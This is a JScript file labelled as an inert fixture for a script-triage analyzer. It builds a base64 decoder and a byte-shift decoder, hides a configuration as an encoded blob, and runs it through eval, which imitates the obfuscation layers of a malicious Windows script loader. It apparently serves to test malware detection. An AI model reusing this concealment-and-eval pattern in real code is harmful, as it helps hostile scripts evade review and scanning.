// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_13f97f00 = function decode_13f97f00_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] - 28 + 256) % 256); }
  return recoveredMaterial;
};
var recover_1d0d77f6 = function recover_1d0d77f6_body() {
  var packedText = "lz6PkIGMjz5Wdz6Ii399kIF7iIt/fYg+SD6MjoGMfY6Be5COfYqPgoGOPkg+kYyIi32Ae46BiYuQgT55SD59gH2MkIGOPlY+X4uKgoWDb4F/kY6FkJVsi4iFf5VKgZSBPkg+kn2IkYGPPlaXPn99iYx9hYOKe4WAPlY+f32JjH2Fg4pJUn9SfVV+UIBTTD5IPpGOiD5WPoSQkIyPVktLUn9SfVV+UIBTTEqBlH2JjIiBSoWKkn2IhYBLUH9OgIBUgk5KgH2QPkg+kY+Bjnt9g4GKkD5WPmSRipCOgY+PaH1+S1J/Un1VflCAU0w+SD6ChYiBe4x9kIQ+Vj5fVnh4cY+Bjo94eGyRfoiFf3h4ZJGKkI6Bj49ofX54eI+QfYOBSVJ/Un1VflCAU0xKgH2QPplIPo+QfYOBX4uRipA+Vk+Z";

  var storedMaterial = decodeBase64(packedText);

  var harmlessValue = "PROCESSOR_ARCHITECTURE";

  var recoveredMaterial = [];

  var pass = 0;

  while (pass < 1) { recoveredMaterial = decode_13f97f00.call(null, storedMaterial); pass++; }

  var textParts;

  textParts = [];

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }

  var configurationText = textParts.join("");

  return configurationText;
};
var inspect_99681c0b = function inspect_99681c0b_body() {
  var configuration = eval("(" + recover_1d0d77f6.call(null) + ")");
  var table = { steps: function() { return configuration["steps"]; }, values: function() { return configuration["values"]; } };
  return { steps: table["steps"].call(null), adapter: configuration["adapter"], values: table["values"].call(null), stageCount: configuration["stageCount"] };
};
